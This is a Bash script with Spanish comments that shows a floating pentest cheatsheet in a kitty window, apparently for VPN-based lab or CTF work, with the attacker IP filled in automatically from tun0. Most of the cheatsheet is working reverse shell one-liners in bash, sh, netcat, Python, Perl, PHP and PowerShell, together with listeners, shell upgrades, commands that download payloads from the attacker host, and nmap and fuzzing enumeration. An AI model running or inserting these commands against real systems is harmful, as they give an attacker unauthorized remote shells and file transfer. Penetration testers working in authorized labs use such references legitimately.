#!/usr/bin/env bash
# Cheatsheet flotante de pentest — Alt + F2
# Rellena automáticamente LHOST con tu IP de tun0 (VPN) y LPORT=443.
# Ventana kitty centrada con less; q/Esc para cerrar.

LHOST="$(ip -4 -o addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)"
[ -z "$LHOST" ] && LHOST="<tun0-down>"
LPORT="${1:-443}"

B=$'\e[1m'; R=$'\e[0m'; D=$'\e[2m'; W=$'\e[97m'; G=$'\e[90m'
K=$'\e[1;93m'; S=$'\e[1;37m'

tmp=$(mktemp)
cat > "$tmp" << EOF
${G}  ┌─${R}${B}${W}[ cheatsheet · LHOST=${LHOST} LPORT=${LPORT} ]${R}${G}──────────────────┐${R}
${D}${W}  └──────────────────────────────────────────────────────────────────┘${R}

${S}  ▌LISTENERS${R}
${G}  ──────────────────────────────────────────────────────────────${R}
  ${K}rl ${LPORT}${R}                       $D listener con auto-PTY (tuyo)$R
  ${K}nc -lvnp ${LPORT}${R}
  ${K}pwncat-cs -lp ${LPORT}${R}

${S}  ▌REVERSE SHELLS  (LHOST=${LHOST})${R}
${G}  ──────────────────────────────────────────────────────────────${R}
  ${K}bash${R}   bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1
  ${K}bash2${R}  bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
  ${K}sh${R}     0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; sh <&196 >&196 2>&196
  ${K}nc${R}     nc -e /bin/bash ${LHOST} ${LPORT}
  ${K}ncmkfifo${R} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f
  ${K}python${R} python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${LHOST}",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
  ${K}perl${R}   perl -e 'use Socket;\$i="${LHOST}";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
  ${K}php${R}    php -r '\$s=fsockopen("${LHOST}",${LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'
  ${K}ps${R}     powershell -nop -c "\$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$s.Write([Text.Encoding]::ASCII.GetBytes(\$r),0,\$r.Length)}"

${S}  ▌UPGRADE TTY${R}
${G}  ──────────────────────────────────────────────────────────────${R}
  ${K}1${R}  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ${K}2${R}  export TERM=xterm  ;  Ctrl-Z
  ${K}3${R}  stty raw -echo; fg  ;  reset
  ${G}  (o usa tu 'rl' que ya hace PTY automático)${R}

${S}  ▌TRANSFERENCIA DE FICHEROS${R}
${G}  ──────────────────────────────────────────────────────────────${R}
  ${K}http${R}   python3 -m http.server 80
  ${K}wget${R}   wget http://${LHOST}/file -O /tmp/file
  ${K}curl${R}   curl http://${LHOST}/file -o /tmp/file
  ${K}scp${R}    scp file user@target:/tmp/
  ${K}nc-tx${R}  nc -lvnp 9001 < file   |   nc ${LHOST} 9001 > file

${S}  ▌ENUM RÁPIDO${R}
${G}  ──────────────────────────────────────────────────────────────${R}
  ${K}ports${R}  nmap -p- --min-rate 5000 -Pn -n TARGET -oG nmap/allports
  ${K}deep${R}   nmap -sCV -p\$ports -Pn TARGET -oN nmap/targeted
  ${K}web${R}    feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  ${K}vhost${R}  ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w subdomains.txt -fs <size>

${D}${W}  └──────────────────────────────────────────────────────────────────┘${R}
${G}  [q] / [Esc] para cerrar${R}

EOF

TMP_KEYS="$tmp" kitty \
    --class float-help \
    --title "Cheatsheet · BoladoBSPWM" \
    --override font_size=10.5 \
    --override initial_window_width=900 \
    --override initial_window_height=760 \
    sh -c 'less -R "$TMP_KEYS"; rm -f "$TMP_KEYS"'
